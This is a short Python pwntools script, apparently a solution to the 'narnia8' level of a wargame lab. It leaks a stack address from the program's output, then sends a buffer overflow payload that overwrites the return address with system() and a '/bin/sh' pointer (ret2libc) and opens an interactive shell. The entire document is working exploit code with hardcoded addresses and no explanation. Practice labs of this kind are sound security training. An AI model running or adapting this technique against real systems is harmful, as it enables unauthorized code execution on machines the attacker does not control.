from pwn import *

payload = ''
payload += 'A'*20

r = process(['/narnia/narnia8',payload])

system = p32(0xf7e4c850)
binsh = p32(0xf7f6ecc8)

output = r.recvline()
print hex(u32(output[20:24]))
replace_addr = u32(output[20:24])

r.close()

payload += p32(replace_addr-20)
payload += 'A'*4                # filler to get to EIP
payload += system               # system overwrite EIP
payload += 'JUNK'               # return address
payload += binsh                # arg for system

r = process(['/narnia/narnia8',payload])
r.interactive()
